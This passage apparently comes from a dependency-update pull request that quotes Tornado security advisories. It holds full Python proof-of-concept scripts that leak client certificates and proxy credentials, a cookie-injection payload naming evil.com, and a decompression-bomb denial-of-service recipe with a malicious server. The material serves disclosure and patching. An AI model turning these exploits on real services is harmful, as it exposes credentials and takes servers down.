ipaddress\nimport os\nimport socket\nimport ssl\nimport sys\nimport tempfile\nimport threading\n\nfrom cryptography import x509\nfrom cryptography.x509.oid import NameOID, ExtendedKeyUsageOID\nfrom cryptography.hazmat.primitives import hashes, serialization\nfrom cryptography.hazmat.primitives.asymmetric import rsa\n\nfrom tornado.httpclient import HTTPRequest\nfrom tornado.curl_httpclient import CurlAsyncHTTPClient\n\ndef _key():\n    return rsa.generate_private_key(public_exponent=65537, key_size=2048)\n\ndef _ca():\n    key = _key()\n    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, \"PoC-CA\")])\n    now = datetime.datetime.now(datetime.timezone.utc)\n    cert = (\n        x509.CertificateBuilder()\n        .subject_name(name).issuer_name(name)\n        .public_key(key.public_key())\n        .serial_number(x509.random_serial_number())\n        .not_valid_before(now - datetime.timedelta(minutes=1))\n        .not_valid_after(now + datetime.timedelta(days=1))\n        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)\n        .sign(key, hashes.SHA256())\n    )\n    return cert, key\n\ndef _leaf(cn, ca_cert, ca_key, ips=None, client=False):\n    key = _key()\n    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])\n    now = datetime.datetime.now(datetime.timezone.utc)\n    b = (\n        x509.CertificateBuilder()\n        .subject_name(name).issuer_name(ca_cert.subject)\n        .public_key(key.public_key())\n        .serial_number(x509.random_serial_number())\n        .not_valid_before(now - datetime.timedelta(minutes=1))\n        .not_valid_after(now + datetime.timedelta(days=1))\n        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)\n    )\n    if ips:\n        b = b.add_extension(\n            x509.SubjectAlternativeName([x509.IPAddress(ipaddress.ip_address(i)) for i in ips]),\n            critical=False,\n        )\n    if client:\n        b = b.add_extension(\n            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.CLIENT_AUTH]), critical=False\n        )\n    return b.sign(ca_key, hashes.SHA256()), key\n\ndef _pem(path, cert, key=None):\n    with open(path, \"wb\") as fh:\n        fh.write(cert.public_bytes(serialization.Encoding.PEM))\n        if key is not None:\n            fh.write(key.private_bytes(\n                serialization.Encoding.PEM,\n                serialization.PrivateFormat.TraditionalOpenSSL,\n                serialization.NoEncryption(),\n            ))\n\nclass TLSServer:\n    def __init__(self, srv_pem, ca_pem, require):\n        self.captures = []\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((\"127.0.0.1\", 0))\n        self.sock.listen(4)\n        self.port = self.sock.getsockname()[1]\n        self.ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n        self.ctx.load_cert_chain(srv_pem)\n        self.ctx.load_verify_locations(ca_pem)\n        self.ctx.verify_mode = ssl.CERT_REQUIRED if require else ssl.CERT_OPTIONAL\n        threading.Thread(target=self._serve, daemon=True).start()\n\n    def _serve(self):\n        while True:\n            try:\n                conn, _ = self.sock.accept()\n            except OSError:\n                return\n            try:\n                s = self.ctx.wrap_socket(conn, server_side=True)\n                self.captures.append(s.getpeercert() or None)\n                try:\n                    s.recv(4096)\n                    s.sendall(b\"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\nConnection: close\\r\\n\\r\\nok\")\n                except Exception:\n                    pass\n                s.close()\n            except Exception:\n                self.captures.append(\"handshake-failed\")\n                conn.close()\n\n    def stop(self):\n        try:\n            self.sock.close()\n        except Exception:\n            pass\n\ndef _cn(peer):\n    if not peer or not isinstance(peer, dict):\n        return None\n    for rdn in peer.get(\"subject\", ()):\n        for k, v in rdn:\n            if k == \"commonName\":\n                return v\n    return None\n\nasync def main():\n    with tempfile.TemporaryDirectory() as tmp:\n        ca_cert, ca_key = _ca()\n        s1_cert, s1_key = _leaf(\"server1.local\", ca_cert, ca_key, ips=[\"127.0.0.1\"])\n        s2_cert, s2_key = _leaf(\"server2.local\", ca_cert, ca_key, ips=[\"127.0.0.1\"])\n        cli_cert, cli_key = _leaf(\"trusted-client\", ca_cert, ca_key, client=True)\n\n        ca_pem = os.path.join(tmp, \"ca.pem\")\n        s1_pem = os.path.join(tmp, \"s1.pem\")\n        s2_pem = os.path.join(tmp, \"s2.pem\")\n        cert_pem = os.path.join(tmp, \"client.crt\")\n        key_pem = os.path.join(tmp, \"client.key\")\n        _pem(ca_pem, ca_cert)\n        _pem(s1_pem, s1_cert, s1_key)\n        _pem(s2_pem, s2_cert, s2_key)\n        _pem(cert_pem, cli_cert)\n        with open(key_pem, \"wb\") as fh:\n            fh.write(cli_key.private_bytes(\n                serialization.Encoding.PEM,\n                serialization.PrivateFormat.TraditionalOpenSSL,\n                serialization.NoEncryption(),\n            ))\n\n        s1 = TLSServer(s1_pem, ca_pem, require=True)\n        s2 = TLSServer(s2_pem, ca_pem, require=False)\n        try:\n            clean = CurlAsyncHTTPClient(max_clients=1, force_instance=True)\n            await clean.fetch(HTTPRequest(\n                f\"https://127.0.0.1:{s2.port}/baseline\",\n                ca_certs=ca_pem, request_timeout=5), raise_error=False)\n            clean.close()\n\n            client = CurlAsyncHTTPClient(max_clients=1, force_instance=True)\n            await client.fetch(HTTPRequest(\n                f\"https://127.0.0.1:{s1.port}/internal-mtls\",\n                client_cert=cert_pem, client_key=key_pem,\n                ca_certs=ca_pem, request_timeout=5), raise_error=False)\n            await client.fetch(HTTPRequest(\n                f\"https://127.0.0.1:{s2.port}/other-host\",\n                ca_certs=ca_pem, request_timeout=5), raise_error=False)\n            await asyncio.sleep(0.2)\n            client.close()\n        finally:\n            s1.stop()\n            s2.stop()\n\n        baseline = _cn(s2.captures[0]) if s2.captures else None\n        leaked = _cn(s2.captures[1]) if len(s2.captures) > 1 else None\n\n        print(f\"{'scenario':<48}{'cert presented to server 2'}\")\n        print(f\"{'-' * 48}{'-' * 28}\")\n        print(f\"{'baseline: clean client, no client_cert':<48}{baseline!r}\")\n        print(f\"{'exploit: reused handle (A had client_cert)':<48}{leaked!r}\")\n        print()\n        print(f\"(sanity) server 1 (mTLS required) saw: {_cn(s1.captures[0]) if s1.captures else None!r}\")\n        print()\n        if baseline is None and leaked == \"trusted-client\":\n            print(\"VERDICT: VULNERABLE — the client certificate from request A was \"\n                  \"presented to server 2 on request B, which specified none.\")\n            return 0\n        print(f\"VERDICT: not reproduced (baseline={baseline!r} leaked={leaked!r})\")\n        return 2\n\nif __name__ == \"__main__\":\n    sys.exit(asyncio.run(main()))\n```\n\nOutput (`pip show tornado` → 6.5.6, installed in the venv):\n\n```\nscenario                                        cert presented to server 2\n----------------------------------------------------------------------------\nbaseline: clean client, no client_cert          None\nexploit: reused handle (A had client_cert)      'trusted-client'\n\n(sanity) server 1 (mTLS required) saw: 'trusted-client'\n\nVERDICT: VULNERABLE — the client certificate from request A was presented to\nserver 2 on request B, which specified none.\n```\n\n##### Vector B — proxy credentials\n\nEach proxy is a separate listener capturing the raw request bytes.\n\n```\n./venv/bin/python poc_proxy_creds.py\n```\n\n```python\nimport asyncio\nimport base64\nimport socket\nimport sys\nimport threading\n\nfrom tornado.httpclient import HTTPRequest\nfrom tornado.curl_httpclient import CurlAsyncHTTPClient\n\nclass CapturingProxy:\n    def __init__(self):\n        self.captures = []\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((\"127.0.0.1\", 0))\n        self.sock.listen(4)\n        self.port = self.sock.getsockname()[1]\n        threading.Thread(target=self._serve, daemon=True).start()\n\n    def _serve(self):\n        while True:\n            try:\n                conn, _ = self.sock.accept()\n            except OSError:\n                return\n            try:\n                data = b\"\"\n                while b\"\\r\\n\\r\\n\" not in data and len(data) < 8192:\n                    chunk = conn.recv(2048)\n                    if not chunk:\n                        break\n                    data += chunk\n                self.captures.append(data)\n                conn.sendall(b\"HTTP/1.1 502 Bad Gateway\\r\\nContent-Length: 0\\r\\n\"\n                             b\"Connection: close\\r\\n\\r\\n\")\n            except Exception:\n                pass\n            finally:\n                conn.close()\n\n    def stop(self):\n        try:\n            self.sock.close()\n        except Exception:\n            pass\n\ndef proxy_authz(raw):\n    head = raw.split(b\"\\r\\n\\r\\n\", 1)[0].decode(\"latin1\", \"replace\")\n    for line in head.split(\"\\r\\n\"):\n        if line.lower().startswith(\"proxy-authorization:\"):\n            return line\n    return None\n\nasync def main():\n    proxy_a = CapturingProxy()\n    proxy_b = CapturingProxy()\n    try:\n        client = CurlAsyncHTTPClient(max_clients=1, force_instance=True)\n        await client.fetch(HTTPRequest(\n            \"http://target.example/a\",\n            proxy_host=\"127.0.0.1\", proxy_port=proxy_a.port,\n            proxy_username=\"alice\", proxy_password=\"secretA\",\n            request_timeout=5, connect_timeout=5), raise_error=False)\n        await client.fetch(HTTPRequest(\n            \"http://target.example/b\",\n            proxy_host=\"127.0.0.1\", proxy_port=proxy_b.port,\n            request_timeout=5, connect_timeout=5), raise_error=False)\n        await asyncio.sleep(0.2)\n        client.close()\n    finally:\n        proxy_a.stop()\n        proxy_b.stop()\n\n    a = proxy_authz(proxy_a.captures[0]) if proxy_a.captures else None\n    b = proxy_authz(proxy_b.captures[0]) if proxy_b.captures else None\n    expected = \"Basic \" + base64.b64encode(b\"alice:secretA\").decode()\n\n    print(f\"{'request':<42}{'Proxy-Authorization seen by that proxy'}\")\n    print(f\"{'-' * 42}{'-' * 40}\")\n    print(f\"{'A -> proxy A (alice:secretA specified)':<42}{a or '(none)'}\")\n    print(f\"{'B -> proxy B (NO credentials specified)':<42}{b or '(none)'}\")\n    print()\n    if b and expected in b:\n        print(f\"VERDICT: VULNERABLE — proxy B received alice's credentials \"\n              f\"({expected}) although request B specified no proxy_username.\")\n        return 0\n    print(f\"VERDICT: not reproduced (proxy B saw: {b!r})\")\n    return 2\n\nif __name__ == \"__main__\":\n    sys.exit(asyncio.run(main()))\n```\n\nOutput (`YWxpY2U6c2VjcmV0QQ==` decodes to `alice:secretA`):\n\n```\nrequest                                   Proxy-Authorization seen by that proxy\n----------------------------------------------------------------------------------\nA -> proxy A (alice:secretA specified)    Proxy-Authorization: Basic YWxpY2U6c2VjcmV0QQ==\nB -> proxy B (NO credentials specified)   Proxy-Authorization: Basic YWxpY2U6c2VjcmV0QQ==\n\nVERDICT: VULNERABLE — proxy B received alice's credentials (Basic\nYWxpY2U6c2VjcmV0QQ==) although request B specified no proxy_username.\n```\n\n##### Impact\n\n* **Type:** Exposure of credentials to an unintended party (CWE-200), via reuse\n  of a resource whose sensitive state was not cleared (CWE-672).\n* **Actors:** An application that issues requests with differing per-request\n  options on a shared `CurlAsyncHTTPClient` — for Vector A, mixing per-request\n  `client_cert` requests with non-certificate requests; for Vector B,\n  multiplexing requests across more than one proxy with per-proxy credentials.\n* **Effect:** For Vector A, the client completes the TLS client-authentication\n  handshake — proving possession of the private key and disclosing the\n  certificate subject and chain — to a host that was never meant to receive it.\n  For Vector B, proxy basic-auth credentials are transmitted (base64) to a\n  different proxy. If the unintended host/proxy is attacker-controlled or\n  attacker-influenced (a user-supplied URL, webhook target, SSRF-reachable\n  endpoint, or a proxy chosen from user-controlled configuration), the credential\n  is disclosed to the attacker.\n* **Scope:** Only applications using the optional `CurlAsyncHTTPClient` backend\n  with the patterns above are affected. The default `SimpleAsyncHTTPClient` is not\n  affected (and does not support proxies).\n\nProposed CWE: CWE-200 / CWE-672. Proposed CVSS 3.1:\n`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` (5.9, medium); attack complexity is\nHigh because exploitation depends on the application using differing per-request\noptions on a shared client and on handle scheduling.\n\n##### Mitigation\n\nA single fix closes all instances of this class: call `curl.reset()` at the start\nof `_curl_setup_request` and then re-apply the per-request options, so no state\nfrom a prior request can persist on the reused handle. (Note `curl.reset()` also\nclears `CAINFO`, which the current code intentionally leaves untouched — see the\ncomment at lines 401-409 — so that default would need to be re-established after\nthe reset.)\n\nAlternatively, add explicit clearing branches mirroring the existing\n`PROXYUSERPWD`/`USERPWD` handling:\n\n```python\n\n##### client certificate\nif request.client_cert is not None:\n    curl.setopt(pycurl.SSLCERT, request.client_cert)\nelse:\n    curl.unsetopt(pycurl.SSLCERT)\nif request.client_key is not None:\n    curl.setopt(pycurl.SSLKEY, request.client_key)\nelse:\n    curl.unsetopt(pycurl.SSLKEY)\n\n##### proxy credentials (inside the `if request.proxy_host and request.proxy_port:` branch)\nif request.proxy_username:\n    ...\n    curl.setopt(pycurl.PROXYUSERPWD, credentials)\nelse:\n    curl.unsetopt(pycurl.PROXYUSERPWD)\n\n##### network interface\nif request.network_interface:\n    curl.setopt(pycurl.INTERFACE, request.network_interface)\nelse:\n    curl.unsetopt(pycurl.INTERFACE)\n```\n\nUntil a fix is available, use a separate `CurlAsyncHTTPClient` instance per\ndistinct credential set (per client certificate / per proxy credential), or use\n`SimpleAsyncHTTPClient` where applicable.\n\n#### Severity\n- CVSS Score: 5.9 / 10 (Medium)\n- Vector String: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-pw6j-qg29-8w7f](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-pw6j-qg29-8w7f)\n- [https://github.com/advisories/GHSA-pw6j-qg29-8w7f](https://redirect.github.com/advisories/GHSA-pw6j-qg29-8w7f)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-pw6j-qg29-8w7f) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado: Incomplete fix for CVE-2026-35536: cookie attribute injection re-opened via the legacy case-insensitive `**kwargs` path in `set_cookie`\n[GHSA-wwv5-g3v4-889x](https://redirect.github.com/advisories/GHSA-wwv5-g3v4-889x)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Summary\nThe CVE-2026-35536 fix added a validation loop that rejects `[\\x00-\\x20\\x3b\\x7f]`, but only for the\nhardcoded **lowercase** keys `name`/`domain`/`path`/`samesite`. The still-live deprecated `**kwargs` path\nwrites attacker-supplied attribute values straight into the `Morsel` with no validation, and because\n`Morsel.__setitem__` is case-insensitive, a capitalized kwarg (`Domain=`, `Path=`, `SameSite=`, `Max-Age=`)\nroutes to the same reserved attribute while bypassing the loop — re-opening `;`-delimited attribute injection.\n\n```python\nself.set_cookie(\"sid\", \"abc\", Domain=\"evil.com; Secure; SameSite=None\")\n\n#####  -> Set-Cookie: sid=abc; Domain=evil.com; Secure; SameSite=None; Path=/\n##### Sanity (the canonical lowercase named arg IS blocked):\nself.set_cookie(\"sid\", \"abc\", domain=\"evil.com; Secure\")   # -> http.cookies.CookieError\n```\n\nThe patch's regression test (`SetCookieForbiddenCharHandler`) only exercises the four named params, never the\n`**kwargs` path, so the gap is not regression-covered.\n\n##### Affected code\n- `tornado/web.py` → `RequestHandler.set_cookie`: the validation loop covers only the lowercase named args;\n  the trailing `if kwargs:` loop does `morsel[k] = v` with no character validation.\n\n##### Steps to reproduce\n`GET /upper` (uses `Domain=` kwarg) emits `Set-Cookie: c_upper=v; Domain=evil.com; Secure; SameSite=None; Path=/`; `GET /lower` (uses lowercase\n`domain=`) returns a `CookieError`.\n\n##### Impact\nInjection of independent cookie attributes (force/drop `Secure`/`HttpOnly`/`SameSite`, rebind `Domain`/`Path`)\n— the same impact CVE-2026-35536 closed, via the sibling path the patch missed. Conditional on the app using\na capitalized/legacy keyword.\n\n##### Suggested remediation\nApply the same `[\\x00-\\x20\\x3b\\x7f]` validation to every entry in the `**kwargs` loop (after normalizing the\nkey case), or remove the deprecated kwargs path; add a regression test for capitalized kwargs.\n\n##### Credit\nReported as part of an incomplete-patch measurement study (responsible disclosure).\n\n#### Severity\n- CVSS Score: 2.3 / 10 (Low)\n- Vector String: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-wwv5-g3v4-889x](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-wwv5-g3v4-889x)\n- [https://github.com/tornadoweb/tornado/pull/3704](https://redirect.github.com/tornadoweb/tornado/pull/3704)\n- [https://github.com/tornadoweb/tornado/pull/3706](https://redirect.github.com/tornadoweb/tornado/pull/3706)\n- [https://github.com/tornadoweb/tornado/commit/6ef836e43e1278530041376adb32504daa977b91](https://redirect.github.com/tornadoweb/tornado/commit/6ef836e43e1278530041376adb32504daa977b91)\n- [https://github.com/tornadoweb/tornado/commit/da284767eae8e1f0484f123b8c3225f6465b09c7](https://redirect.github.com/tornadoweb/tornado/commit/da284767eae8e1f0484f123b8c3225f6465b09c7)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.8](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.8)\n- [https://github.com/advisories/GHSA-wwv5-g3v4-889x](https://redirect.github.com/advisories/GHSA-wwv5-g3v4-889x)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-wwv5-g3v4-889x) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### tornado: multipart split() creates huge temp list before max_parts check -> memory amplification DoS (httputil.py:34)\n[GHSA-8423-8fgw-73vq](https://redirect.github.com/advisories/GHSA-8423-8fgw-73vq)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Description\n\n##### Summary\n\n`parse_multipart_form_data` (httputil.py:34) calls\n`data.split(b\"--\"+boundary+b\"\\r\\n\")` **before** the `max_parts` check (:35).\nA 600KB body with 100k parts creates a 100k-element transient list first,\nthen rejects   transient memory amplification (each split element is a copy).\nPre-auth HTTP DoS.\n\n##### Root cause\n\n```python\nparts = data[:final_boundary_index].split(b\"--\" + boundary + b\"\\r\\n\")  # :34  huge list first\nif len(parts) > config.max_parts:                                       # :35  check after\n    raise HTTPInputError(\"multipart/form-data has too many parts\")\n```\n\n##### PoC\n\ngist: https://gist.github.com/afldl/649861f25d39b53b7edbe0298e171617\n`poc.py` + `output.txt` (100k parts from 600KB   transient list).\n\n##### Fix\n\nCount separators without materializing the list (e.g. `data.count(b\"--\"+boundary)` first).\n\n##### Credit\n\nReported by afldl, 2026-07.\n\n#### Severity\n- CVSS Score: 6.9 / 10 (Medium)\n- Vector String: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-8423-8fgw-73vq](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-8423-8fgw-73vq)\n- [https://github.com/tornadoweb/tornado/pull/3704](https://redirect.github.com/tornadoweb/tornado/pull/3704)\n- [https://github.com/tornadoweb/tornado/commit/de85b3f87446e323e881bbaa3d5a74f4b76e5f05](https://redirect.github.com/tornadoweb/tornado/commit/de85b3f87446e323e881bbaa3d5a74f4b76e5f05)\n- [https://gist.github.com/afldl/649861f25d39b53b7edbe0298e171617](https://gist.github.com/afldl/649861f25d39b53b7edbe0298e171617)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.8](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.8)\n- [https://github.com/advisories/GHSA-8423-8fgw-73vq](https://redirect.github.com/advisories/GHSA-8423-8fgw-73vq)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-8423-8fgw-73vq) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n###  Tornado: Urlencoded body parsing omits max_num_fields, so one request can stall the event loop\n[CVE-2026-82397](https://nvd.nist.gov/vuln/detail/CVE-2026-82397) / [GHSA-mpf4-983q-p7j4](https://redirect.github.com/advisories/GHSA-mpf4-983q-p7j4)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Summary\n\nTornado parses `application/x-www-form-urlencoded` bodies with `urllib.parse.parse_qs` and does not pass `max_num_fields`. A body made almost entirely of separators produces tens of millions of fields, and the parse happens on the event loop before the handler runs, so a single request stalls the whole server.\n\n##### Where it is\n\n`tornado/escape.py`, at HEAD `e530031405e2154654dedc4c84d5656b557ea310`:\n\n```python\nresult = urllib.parse.parse_qs(\n    qs, keep_blank_values, strict_parsing, encoding=\"latin1\", errors=\"strict\"\n)\n```\n\n`max_num_fields` is the parameter CPython added for exactly this, and it is absent.\n\nThe path to it is entirely server-side and pre-dispatch. `RequestHandler._execute` parses the body at `tornado/web.py:1821`, which reaches `HTTPServerRequest._parse_body` at `tornado/httputil.py:636`, and the urlencoded branch of `parse_body_arguments` calls `parse_qs_bytes` at `tornado/httputil.py:1030`.\n\nThe size that reaches it is bounded only by the body cap, which defaults to the stream's `max_buffer_size` of 104857600 at `tornado/iostream.py:239`, applied as the request body default at `tornado/http1connection.py:136-140`. A 100 MB body of separators is around fifty million fields.\n\n##### Impact\n\nDenial of service against the whole process, not one request. Tornado is single-threaded and the parse is synchronous on the event loop, so every other connection waits. No authentication is needed if any route accepts a form post, which is the normal case.\n\n##### Suggested fix\n\nPass a bound:\n\n```python\nresult = urllib.parse.parse_qs(\n    qs, keep_blank_values, strict_parsing, encoding=\"latin1\", errors=\"strict\",\n    max_num_fields=max_num_fields,\n)\n```\n\nwith a conservative default and a way for applications to raise it. CPython raises `ValueError` when the limit is exceeded, which maps cleanly onto a 400.\n\nLowering the default body cap for urlencoded specifically would help too, since 100 MB of form fields is not a shape any real client sends.\n\n##### Why I do not think this is a duplicate\n\nThe published tornado advisories cover out-of-bounds access in the C extension, unbounded accumulation of decompressed chunks in `AsyncHTTPClient`, the Authorization header surviving cross-origin redirects, credential leakage on curl handle reuse, and cookie attribute validation. The decompression one is the nearest in spirit and is on the client side; this is the server parsing a request body. The call is unchanged at HEAD.\n\n#### Severity\n- CVSS Score: 7.5 / 10 (High)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-mpf4-983q-p7j4](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-mpf4-983q-p7j4)\n- [https://nvd.nist.gov/vuln/detail/CVE-2026-82397](https://nvd.nist.gov/vuln/detail/CVE-2026-82397)\n- [https://github.com/tornadoweb/tornado/pull/3704](https://redirect.github.com/tornadoweb/tornado/pull/3704)\n- [https://github.com/tornadoweb/tornado/commit/8d6363ed7b69d5f0da806efe34d256627a2191de](https://redirect.github.com/tornadoweb/tornado/commit/8d6363ed7b69d5f0da806efe34d256627a2191de)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.8](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.8)\n- [https://github.com/advisories/GHSA-mpf4-983q-p7j4](https://redirect.github.com/advisories/GHSA-mpf4-983q-p7j4)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-mpf4-983q-p7j4) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### tornado: CurlAsyncHTTPClient enforces no response-size limit — decompression bomb drives unbounded memory accumulation to OOM\n[GHSA-chx6-46f5-w4vp](https://redirect.github.com/advisories/GHSA-chx6-46f5-w4vp)\n\n<details>\n<summary>More information</summary>\n\n#### Details\nAn unbounded memory accumulation (decompression bomb) in `tornado.curl_httpclient.CurlAsyncHTTPClient` — the client-side sibling gap of CVE-2026-49855 — verified end-to-end on the 2026-08-15 master snapshot (`6.6.dev1`) and present unchanged in the latest release tag `v6.5.8` and on master (checked 2026-08-17). When a Tornado application configures the curl client (the documented deployment for proxy support / advanced TLS options) and `fetch()`es an attacker-chosen or attacker-compromised URL with default `decompress_response=True`, a malicious server replying `Content-Encoding: gzip` with a ~2.8 MB wire bomb drove the client's RSS from 30,884 kB to **1,032,100 kB (~1008 MB) in 3.18 s** (~350 MB/s, monotonic, no plateau) until the kernel OOM-killed the process (exit 137, cgroup `OOMKilled=true`) — with the transfer only 67% complete and **no client-side size check ever intervening**: `curl_httpclient.py` contains zero occurrences of `max_body_size`/`MAXFILESIZE`. The identical bomb against the default `SimpleAsyncHTTPClient` fails cleanly at ~65 MB, because every size gate CVE-2026-49855 added (compressed CL, chunked total, cumulative decompressed size — `http1connection.py:620,676,742`) lives in code the curl client never executes. This is a distinct component from the published advisory (which fixed `_GzipMessageDelegate`/`SimpleAsyncHTTPClient` only) and from the other curl-client advisories (credential handle-reuse GHSA-pw6j-qg29-8w7f, header CRLF GHSA-w235-7p84-xx57); the file's full commit history (latest 2026-06-17) shows no response-size work.\n\n##### Details\n\n`tornado/curl_httpclient.py` (line numbers identical on master `6.6.dev1`, `v6.5.8`, and the audited snapshot):\n\n```python\n\"buffer\": BytesIO(),                                  # :202 — plain BytesIO, no accounting\n...\nelse:\n    write_function = buffer.write                     # :359 — every decompressed byte lands here\ncurl.setopt(pycurl.WRITEFUNCTION, write_function)     # :360\n...\nif request.decompress_response:                       # default True (HTTPRequest)\n    curl.setopt(pycurl.ENCODING, \"gzip,deflate\")      # :373-374 — libcurl advertises + auto-decodes\n```\n\nlibcurl decompresses the response **before** invoking `WRITEFUNCTION`, so the callback receives decompressed bytes, which are appended to an unbounded `BytesIO` until the transfer ends or the process dies. The only ceiling is `request_timeout` (default 20 s) — at zlib's hundreds of MB/s that still permits many GB of accumulation; the PoC raised it to 300 s and the 1 GiB cgroup cap was hit in 3.2 s regardless. There is no `pycurl.MAXFILESIZE`, no `max_buffer_size`/`max_body_size` plumbing (the constructor accepts no body-size option), and `streaming_callback` users fare no better (the callback variant at `:353-356` also performs zero accounting).\n\nContrast — `SimpleAsyncHTTPClient` path (`tornado/http1connection.py`), all absent from the curl path:\n\n```python\nif cast(int, content_length) > self._max_body_size:        # :620  Content-Length gate\nif total_size > self._max_body_size:                       # :676  chunked total gate\nif self._decompressed_body_size > self._max_body_size:     # :742  CVE-2026-49855 decompressed gate\n```\n\n`SimpleAsyncHTTPClient.initialize()` defaults `max_buffer_size = 104857600` (100 MiB) with `max_body_size` defaulting to it (`simple_httpclient.py:117-121`); `CurlAsyncHTTPClient.initialize()` has no corresponding parameter at all.\n\nAttack chain (attacker = malicious HTTP server; victim = any Tornado app doing `fetch()` on attacker-influenced URLs — URL fetchers, webhook processors, link previewers, RSS/probe pollers):\n\n1. App configures `AsyncHTTPClient.configure(\"tornado.curl_httpclient.CurlAsyncHTTPClient\")` (documented for proxy support; proxies are only supported with the curl client).\n2. App calls `fetch(\"http://attacker/...\")` with defaults → request advertises `Accept-Encoding: gzip,deflate`.\n3. Attacker replies `200`, `Content-Encoding: gzip`, `Transfer-Encoding: chunked`, body = a gzip stream of zeros (4,174,525 wire bytes expanding to 4 GiB, 1029:1, sent in 64 KB chunks).\n4. libcurl auto-decodes at ~350 MB/s into `buffer.write` with no size accounting → process RSS climbs linearly until OOM. The response need not complete: the client died with 2,818,048/4,174,525 wire bytes delivered (67%).\n\nVariant without compression: `decompress_response=False` plus an endless streaming body (no Content-Length, no final chunk) feeds the same unaccounted `buffer.write` — this client never enforces any cap on any path.\n\n##### PoC\n\nVerified end-to-end 2026-08-15 in a single container (cgroup `--memory 1g --memory-swap 1g` so the exhaustion endpoint is safe and fast to observe), two processes over a real TCP socket on `127.0.0.1:8081`: a raw-socket malicious server (`evil_server.py`, builds the 4 GiB-of-zeros gzip bomb once, serves it with chunked framing) and the Tornado victim (`victim_curl.py`, configures `CurlAsyncHTTPClient`, `fetch(..., request_timeout=300)`, samples `/proc/self/status` VmRSS every 0.2 s from a monitor thread so the curve survives the OOM kill).\n\n##### Build & run the victim\n\n```bash\ngit clone https://github.com/tornadoweb/tornado\ncd tornado\npip install pycurl\npython evil_server.py &     # 127.0.0.1:8081; prints BOMB_BUILT wire_bytes=... ratio=... EVIL_LISTENING\npython victim_curl.py       # victim: CurlAsyncHTTPClient fetch -> expect linear RSS rise -> OOM\npython victim_simple.py     # control: default SimpleAsyncHTTPClient on the same bomb\n```\n\nVerified environment: debian:bookworm-slim, Python 3.11.2, python3-pycurl 7.45.2 (libcurl 7.88.1, zlib 1.2.13), tornado master snapshot `6.6.dev1` of 2026-08-15 run from the source tree (`sys.path`), container memory capped at 1 GiB. `curl_httpclient.py` verified byte-equivalent (still zero size-limit references) in tag `v6.5.8` and on master as of 2026-08-17.\n\n##### Reproduction steps\n\n1. **Precondition — the documented curl-client deployment fetching a remote URL.** The vulnerability requires the application to use `CurlAsyncHTTPClient` (the standard configuration when proxy support or advanced TLS options are needed) with default `decompress_response=True`, and to fetch a URL whose server the attacker controls or has compromised. `victim_curl.py` implements exactly that (`AsyncHTTPClient.configure(\"tornado.curl_httpclient.CurlAsyncHTTPClient\")` → `fetch()`), and the server log confirms the ENCODING path engaged — the victim's request arrived with `User-Agent: Mozilla/5.0 (compatible; pycurl)` and `Accept-Encoding: gzip,deflate`.\n\n2. **Attack:** start `evil_server.py`, wait for `EVIL_LISTENING`, then run `victim_curl.py` (the fetch itself is the attack; no further interaction).\n\n3. **Expected:** `victim_curl_rss.log` shows VmRSS 30,884 → 1,032,100 kB over 3.18 s, rising ~350 MB/s with no plateau; the container kills the victim (`exit 137`, docker `OOMKilled=true`); the server logs `CLIENT_DIED_MID_TRANSFER wire_sent=2818048/4174525` — the accumulation is bounded only by available memory, never by a client-side check, and the 4 GiB payload was never fully delivered.\n\n4. **Variant:** with `decompress_response=False` and an unterminated chunked body (server keeps sending forever), the same `buffer.write` path accumulates unbounded plain bytes — no compression needed; `request_timeout` only extends the ceiling.\n\n5. 